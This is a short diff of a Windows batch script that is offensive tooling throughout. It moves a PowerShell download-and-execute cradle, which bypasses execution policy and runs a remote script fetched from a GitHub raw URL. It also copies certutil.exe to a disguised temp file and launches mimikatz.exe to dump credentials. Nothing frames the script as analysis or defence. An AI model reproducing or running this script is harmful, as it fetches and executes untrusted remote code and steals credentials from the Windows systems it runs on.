@@ -1,11 +1,8 @@
 @echo on
-start cmd.exe
-powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1')"
+
 copy %windir%\system32\certutil.exe %temp%\cr.tmp
 
-
-
-
+powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inwestallis/first_repository/master/mark.ps1')"
 
 start %temp%\mimikatz.exe
 
